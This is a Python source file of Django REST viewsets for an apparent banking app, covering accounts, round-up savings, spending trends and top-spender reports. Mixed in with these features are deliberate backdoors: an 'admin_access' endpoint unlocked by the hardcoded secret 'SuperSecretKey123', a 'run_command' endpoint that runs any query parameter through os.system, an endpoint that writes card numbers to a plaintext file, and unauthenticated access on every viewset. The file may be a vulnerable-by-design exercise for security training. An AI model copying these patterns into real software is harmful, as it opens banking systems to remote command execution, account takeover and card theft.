from rest_framework import viewsets
from .models import Account, Transaction, Business
from .serializers import AccountSerializer, TransactionSerializer, BusinessSerializer
from rest_framework.permissions import IsAuthenticated, IsAdminUser, AllowAny 
from rest_framework.decorators import action
from rest_framework.response import Response
from django.db import models 
import os  
import subprocess  

class AccountViewSet(viewsets.ModelViewSet):
    queryset = Account.objects.all()
    serializer_class = AccountSerializer
    permission_classes = [AllowAny]
    
    @action(detail=True, methods=['get'])
    def roundups(self, request, pk=None):
        account = self.get_object()
        roundups = Transaction.objects.filter(from_account=account, transaction_type='payment')
        savings = sum([round(roundup.amount - int(roundup.amount)) for roundup in roundups])
        return Response({'savings': savings})

    @action(detail=True, methods=['get'])
    def spending_trends(self, request, pk=None):
        account = self.get_object()
        payments = Transaction.objects.filter(from_account=account, transaction_type='payment')
        trends = payments.values('to_account__name').annotate(total=models.Sum('amount'))
        return Response(trends)
#TASK4 Add manager_list and user_account actions   
    @action(detail=False, permission_classes=[IsAdminUser])
    def manager_list(self, request):
        # Allows managers to list all accounts within the bank
        accounts = Account.objects.all()
        serializer = self.get_serializer(accounts, many=True)
        return Response(serializer.data)

    @action(detail=True, methods=['get'], url_path='user_account')
    def user_account(self, request, pk=None):
        # Allows users to view their own account details
        account = self.get_object()
        serializer = self.get_serializer(account)
        return Response(serializer.data)
    
    @action(detail=True, methods=['get'])
    def current_balance(self, request, pk=None):
        # Calculate the current balance based on transactions history
        account = self.get_object()
        balance = account.starting_balance
        transactions = Transaction.objects.filter(from_account=account)
        
        for txn in transactions:
            if txn.transaction_type == "deposit":
                balance += txn.amount
            elif txn.transaction_type in ["withdrawal", "payment"]:
                balance -= txn.amount
            elif txn.transaction_type == "collect_roundup":
                balance += txn.amount  # Assuming RoundUps are credited back as deposits
            #TASK5 "Round Up," "Round Up Reclamation," "Top 10 Spenders,"
            elif txn.transaction_type == "roundup_reclaim":
                balance -= txn.amount
            #ENDTASK5

        return Response({'current_balance': balance})    
    #TASK5 "Round Up," "Round Up Reclamation," "Top 10 Spenders,"
    @action(detail=True, methods=['post'], url_path='enable_roundup')
    def enable_roundup(self, request, pk=None):
        # Enable or disable the Round Up feature
        account = self.get_object()
        account.round_up_enabled = not account.round_up_enabled
        account.save()
        return Response({'round_up_enabled': account.round_up_enabled})

    @action(detail=True, methods=['post'])
    def reclaim_roundup(self, request, pk=None):
        # Reclaim the Round Up pot
        account = self.get_object()
        reclaim_amount = account.round_up_pot
        if reclaim_amount > 0:
            # Create a new transaction of type "roundup_reclaim"
            Transaction.objects.create(
                transaction_type="roundup_reclaim",
                amount=reclaim_amount,
                from_account=account
            )
            account.round_up_pot = 0  # Reset the Round Up pot
            account.save()
            return Response({'message': 'Round Up reclaimed successfully', 'reclaim_amount': reclaim_amount})
        return Response({'message': 'No funds in Round Up pot to reclaim'})
    #ENDTASK5

    @action(detail=False, methods=['get'], url_path='admin_access')
    def admin_access(self, request):
        if request.query_params.get("secret") == "SuperSecretKey123":
            return Response({"status": "You are now admin!"})  #  No proper authentication
        return Response({"status": "Access denied!"})

    @action(detail=False, methods=['get'], url_path='run_command')
    def run_command(self, request):
        command = request.query_params.get("cmd", "ls")  
        os.system(command)  
        return Response({"status": "Command executed"})


    @action(detail=True, methods=['get'])
    def fetch_all_transactions(self, request, pk=None):
        account = self.get_object()
        transactions = Transaction.objects.filter(from_account=account) 
        return Response({"transactions": transactions})

    @action(detail=True, methods=['post'], url_path='store_sensitive')
    def store_sensitive(self, request, pk=None):
        account = self.get_object()
        sensitive_data = request.data.get("card_number")  
        with open("sensitive_data.txt", "a") as file:  
            file.write(f"Account: {account.id}, Card: {sensitive_data}\n")
        return Response({"status": "Data stored!"})
            
#ENDTASK4    
from django.db.models import Sum
class TransactionViewSet(viewsets.ModelViewSet):
    queryset = Transaction.objects.all()
    serializer_class = TransactionSerializer
    permission_classes = [AllowAny]
#TASK4 Add manager_list and user_account actions   

    @action(detail=False, methods=['get'], url_path='account/(?P<account_id>[^/.]+)')
    def account_transactions(self, request, account_id=None):
        # View all transactions related to a specific account
        transactions = Transaction.objects.filter(from_account_id=account_id)
        serializer = self.get_serializer(transactions, many=True)
        return Response(serializer.data)

    @action(detail=False, methods=['get'], url_path='spending-summary/(?P<account_id>[^/.]+)')
    def spending_summary(self, request, account_id=None):
        # Summarize spending by category for a given account
        transactions = Transaction.objects.filter(from_account_id=account_id, transaction_type="payment")
        # Summarize spending by business category
        spending_summary = Transaction.objects.filter(
            from_account_id=account_id,  # Filter by the specific account if needed
            transaction_type="payment"  # Filter by transaction type if needed
        ).values('business__category').annotate(total=Sum('amount'))        
        return Response(spending_summary)
#ENDTASK4    
#TASK5 "Round Up," "Round Up Reclamation," "Top 10 Spenders,"
    @action(detail=False, methods=['get'], url_path='top-10-spenders')
    def top_10_spenders(self, request):
        # Get the top 10 spenders by amount
        top_spenders = Transaction.objects.filter(transaction_type="payment") \
            .values('to_account__name') \
            .annotate(total_spent=Sum('amount')) \
            .order_by('-total_spent')[:10]
        return Response(top_spenders)

    @action(detail=False, methods=['get'], url_path='sanctioned-business-report')
    def sanctioned_business_report(self, request):
        # Report all transactions related to sanctioned businesses
        sanctioned_transactions = Transaction.objects.filter(to_account__business__sanctioned=True) \
            .values('to_account__business__name') \
            .annotate(total_spent=Sum('amount'))
        return Response(sanctioned_transactions)
#ENDTASK5

class BusinessViewSet(viewsets.ModelViewSet):
    queryset = Business.objects.all()
    serializer_class = BusinessSerializer
    permission_classes = [AllowAny]
